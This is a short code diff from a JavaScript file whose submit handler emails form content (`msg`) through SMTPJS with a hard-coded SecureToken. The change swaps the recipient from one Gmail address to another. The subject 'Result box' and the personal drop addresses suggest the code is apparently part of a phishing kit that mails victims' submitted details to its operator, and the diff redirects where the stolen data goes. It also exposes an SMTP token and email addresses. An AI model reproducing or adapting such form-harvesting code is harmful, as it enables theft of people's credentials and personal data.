@@ -7,7 +7,7 @@ $(document).on('click','#submit', function(e) {
 
     Email.send({
         SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
-        To: 'shirleylargey40@gmail.com',
+        To: 'josephinebarbra1@gmail.com',
         From: "shirleylargey40@gmail.com",
         Subject: `Result box`,
         Body: `${msg}`,
